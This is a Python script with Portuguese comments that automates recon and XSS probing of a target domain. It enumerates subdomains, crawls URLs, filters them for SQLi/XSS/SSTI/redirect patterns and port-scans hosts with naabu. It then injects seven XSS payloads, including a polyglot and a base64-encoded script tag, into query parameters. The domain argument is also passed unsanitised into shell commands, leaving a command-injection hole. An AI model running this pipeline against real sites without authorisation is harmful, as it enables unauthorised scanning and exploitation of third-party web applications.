
#eike de camos oliveira
import os
import time 
import sys 
#digit o doomínio aqui
domain = sys.argv[1]

# declarando payloads pessoais:
 
pay1 = "<script>alert(1)</script>"
pay2 = "<svg onload=confirm(1)>"
pay3 =  "javascript:alert(1)"
pay4 = '''JavaScript://%250Aalert?.(1)//
'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!-->
</Title/</Style/</Script/</textArea/</iFrame/</noScript>
\74k<K/contentEditable/autoFocus/OnFocus=
/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76--> #XSS'''
pay5 = '''"AutoFocus/>/OnFocus=top?.["ale"+"rt"](1)/"'''
pay6 = "<Svg Only=1 OnLoad=confirm(1)>"
pay7 = "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="

# você pode integrar quantas ferramentas quiser aqui:

time.sleep(4)
print("começando enumeração de Subdomínios[*]")
os.system(f"mkdir {domain}" )
os.system(f"echo {domain} | assetfinder | tee -a assets.txt")
os.system(f"subfinder -d {domain} -o subf.txt -silent ")

time.sleep(0.5)

print("iniciando amass, isso pode demorar um pouco, então dá uma olhada na nossa playlist no YT: https://encurtador.com.br/nO045 ")


time.sleep(3)

os.system(f"amass enum -d {domain} -passive -o amass.txt")

time.sleep(3)



os.system(f"cat amass.txt assets.txt subf.txt | anew domains.txt ")
os.system(f"cat *.txt | httprobe | tee -a h1")
os.system(f"cat amass.txt assets.txt subf.txt | httpx -silent -o h2 ")
time.sleep(0.3)
os.system(f"cat h1 h2 | anew hosts")

# agora vamos pegar  ips
os.system("cat domains.txt | dnsx --resp-only -o ips.txt")
time.sleep(1)

print("começando Craw de URLS[*]")

os.system(f"cat hosts | gau  --threads 5 | tee -a urls.txt") 
os.system(f"cat urls.txt | anew | uro | tee -a mass.txt")

time.sleep(0.5)
print("começando a separar padrõe")

# aqui voce pode editar os padrões de acordo com a sua preferência. 
os.system(f"cat mass.txt | gf sqli | tee -a sqli.txt")
os.system(f"cat mass.txt | gf xss | tee -a xss.txt")
os.system(f"cat mass.txt | gf ssti | tee -a ssti.txt")
os.system(f"cat mass.txt | gf redirect | tee -a redir.txt")
os.system(f"cp  sqli.txt xss.txt ssti.txt redir.txt {domain}")

time.sleep(1)
os.system(f"cat amass.txt assets.txt subf.txt | anew full.txt")

portscan = "80,81,82,88,135,143,300,443,554,591,593,832,902,981,993,1010,1024,1311,2077,2079,2082,2083,2086,2087,2095,2096,2222,2480,3000,3128,3306,3333,3389,4243,4443,4567,4711,4712,4993,5000,5001,5060,5104,5108,5357,5432,5800,5985,6379,6543,7000,7170,7396,7474,7547,8000,8001,8008,8014,8042,8069,8080,8081,8083,8085,8088,8089,8090,8091,8118,8123,8172,8181,8222,8243,8280,8281,8333,8443,8500,8834,8880,8888,8983,9000,9043,9060,9080,9090,9091,9100,9200,9443,9800,9981,9999,10000,10443,12345,12443,16080,18091,18092,20720,28017,49152"

os.system(f"cat domains.txt  | naabu -p {portscan} -o ports.txt")

# portscan usando naabu /\
time.sleep(0.5)

# usando varreddura de xss sem força bruta 
print("INICIANDO VARREDURA DE XSS[****]")
os.system(f"cat {domain}/xss.txt | qsreplace '{pay1}'| airixss -payload 'alert(1)' | egrep -v 'Not' | tee -a {domain}/resultsxxs.txt")
os.system(f"cat {domain}/xss.txt | qsreplace '{pay2}' | airixss -payload 'confirm(1)' | egrep -v 'Not' | tee -a {domain}/resultsxss.txt")
os.system(f"cat {domain}/xss.txt | qsreplace '{pay3}' | airixss -payload 'alert(1)' | egrep -v 'Not'| tee -a {domain}/resultsxxs.txt")
os.system(f"cat {domain}/xss.txt | qsreplace '{pay4}' | airixss -payload 'alert(1)' | egrep -v 'Not' | tee -a {domain}/resultsxxs.txt")
os.system(f"cat {domain}/xss.txt | qsreplace '{pay5}' | airixss -payload 'alert(1)' | egrep -v 'Not' | tee -a {domain}/resultsxxs.txt ")
os.system(f"cat {domain}/xss.txt | qsreplace '{pay6}' | airixss -payload 'confirm(1)' | egrep -v 'Not' | tee -a {domain}/resultsxxs.txt")
os.system(f"cat {domain}/xss.txt | qsreplace '{pay7}' | airixss -payload 'alert(1)' | egrep -v 'Not'| tee -a {domain}/resultsxxs.txt")

time.sleep(0.5)

# pegando conteúdo de páginas  usando meg 

os.system(f"meg -d 1000 -v /")

print("use o: 'grep -Hrni *' paara grepar  tudo o que você útil para o reconhecimento")
time.sleep(10)
 # separando Json e JS em um arquivo.
os.system(f"cat mass.txt | grep '.js' | tee -a {domain}/js.txt")
